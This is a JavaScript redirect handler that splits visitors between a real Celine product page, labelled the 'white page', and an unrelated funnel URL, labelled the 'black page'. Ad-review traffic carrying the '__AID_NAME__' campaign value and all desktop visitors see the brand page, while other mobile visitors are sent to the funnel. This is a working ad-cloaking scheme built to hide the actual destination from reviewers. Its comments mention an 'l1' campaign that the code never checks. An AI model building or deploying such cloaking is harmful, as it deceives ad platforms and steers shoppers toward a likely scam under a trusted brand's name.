export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://www.celine.com/en-us/celine-shop-men/ready-to-wear/t-shirts-and-sweatshirts/triomphe-loose-t-shirt-in-cotton-jersey-2X04I671Q.09MO.html?nav=E0016";
    const blackPageURL = "https://qgclxsamql.myfunnelish.com/imbassd-1735585339447351";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();
  }
